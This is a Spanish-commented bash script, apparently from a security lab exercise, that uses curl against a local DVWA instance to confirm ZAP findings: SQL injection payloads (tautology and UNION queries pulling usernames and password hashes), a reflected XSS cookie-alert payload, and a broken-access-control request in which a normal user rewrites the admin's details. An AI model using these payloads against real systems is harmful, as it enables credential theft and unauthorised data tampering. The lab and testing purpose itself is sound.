#!/usr/bin/env bash
# Confirma manualmente las 3 vulnerabilidades OWASP Top 10 que reporta ZAP en DVWA (low).
set -uo pipefail
URL=${1:-http://127.0.0.1:4280}
cd "$(dirname "$0")"; C=$(cat .cookie)
strip() { sed -n '/<div class="vulnerable_code_area">/,/<\/div>/p' | sed 's/<[^>]*>/ /g; s/&gt;/>/g; s/&lt;/</g' | tr -s ' \n' | head -c 900; echo; }

echo "=== A03:2021 Inyeccion - SQL Injection (/vulnerabilities/sqli/)"
echo "--- Normal: id=1"
curl -s -b "$C" -G "$URL/vulnerabilities/sqli/" --data-urlencode "id=1" -d Submit=Submit | grep -oE "First name: [^<]*|Surname: [^<]*"
echo "--- Tautologia: id=1' OR '1'='1  (devuelve TODOS los usuarios)"
curl -s -b "$C" -G "$URL/vulnerabilities/sqli/" --data-urlencode "id=1' OR '1'='1" -d Submit=Submit | grep -oE "First name: [^<]*" 
echo "--- UNION: extrae usuario y hash de contrasena de la tabla users"
curl -s -b "$C" -G "$URL/vulnerabilities/sqli/" --data-urlencode "id=' UNION SELECT user, password FROM users#" -d Submit=Submit | grep -oE "First name: [^<]*<br />Surname: [^<]*" | sed 's/<br \/>/ | /'
echo "--- Version del motor: UNION SELECT @@version"
curl -s -b "$C" -G "$URL/vulnerabilities/sqli/" --data-urlencode "id=' UNION SELECT @@version, database()#" -d Submit=Submit | grep -oE "First name: [^<]*<br />Surname: [^<]*" | sed 's/<br \/>/ | /'

echo; echo "=== A03:2021 Inyeccion - Cross-Site Scripting reflejado (/vulnerabilities/xss_r/)"
P='<script>alert(document.cookie)</script>'
curl -s -b "$C" -G "$URL/vulnerabilities/xss_r/" --data-urlencode "name=$P" | grep -o "Hello <script>alert(document.cookie)</script>" \
  && echo "-> El payload regresa SIN codificar: se ejecuta en el navegador de la victima (robo de cookie de sesion; la cookie no tiene HttpOnly)"
echo "--- Cookies de una sesion nueva (sin HttpOnly ni SameSite):"; curl -s -D - -o /dev/null "$URL/login.php" | grep -i "set-cookie" | sed -E "s/PHPSESSID=[0-9a-f]+/PHPSESSID=<id>/"

echo; echo "=== A01:2021 Control de acceso roto (/vulnerabilities/authbypass/)"
JAR=$(mktemp); tok() { grep -oP "user_token' value='\K[0-9a-f]+"; }
T=$(curl -s -c "$JAR" "$URL/login.php" | tok)
curl -s -c "$JAR" -b "$JAR" -d "username=gordonb&password=abc123&Login=Login&user_token=$T" "$URL/login.php" -o /dev/null
sed -i 's/\tsecurity\t[a-z]*$/\tsecurity\tlow/' "$JAR"; echo -e "127.0.0.1\tFALSE\t/\tFALSE\t0\tsecurity\tlow" >> "$JAR"
echo "--- Sesion de gordonb (usuario normal, NO admin):"
curl -s -b "$JAR" "$URL/vulnerabilities/authbypass/" | grep -oE "This page should only be accessible by the admin user[^<]*|Unauthorised" | head -1
echo "--- gordonb llama directo a la API de datos de usuarios (deberia ser 403):"
curl -s -b "$JAR" -w "  [HTTP %{http_code}]\n" "$URL/vulnerabilities/authbypass/get_user_data.php"
echo "--- gordonb MODIFICA los datos del usuario id=1 (admin):"
curl -s -b "$JAR" -w "  [HTTP %{http_code}]\n" -H 'Content-Type: application/json' \
  -d '{"id":1,"first_name":"Hacked","surname":"ByGordon"}' "$URL/vulnerabilities/authbypass/change_user_details.php"
curl -s -b "$JAR" "$URL/vulnerabilities/authbypass/get_user_data.php" | grep -o '{"user_id":"1"[^}]*}'
echo "--- restaurar admin:"
curl -s -b "$C" -H 'Content-Type: application/json' -d '{"id":1,"first_name":"admin","surname":"admin"}' "$URL/vulnerabilities/authbypass/change_user_details.php"; echo
rm -f "$JAR"
